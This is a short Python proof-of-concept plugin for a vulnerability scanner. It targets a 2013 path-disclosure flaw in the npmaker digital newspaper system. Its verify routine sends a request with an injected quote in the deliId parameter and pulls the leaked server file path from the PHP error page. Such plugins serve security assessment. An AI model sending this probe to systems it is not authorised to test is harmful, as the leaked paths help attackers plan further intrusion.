# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'npmaker_0000' # 平台漏洞编号，留空
    name = 'npmaker数字报爆路径' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2013-07-26'  # 漏洞公布时间
    desc = '''
        npmaker数字报爆路径
    ''' # 漏洞描述
    ref = 'https://www.2cto.com/article/201307/231014.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'npmaker'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '66eb184a-2a06-446a-9f5b-184e261bbcc9'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            code, head, res, errcode, _ = hh.http(url + '/www/index.php?mod=admin&con=deliver&act=view&username=809763517&deliId=-32%27')
            if code == 200:
                m = re.search('non-object in <b>([^<]+)</b>', res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()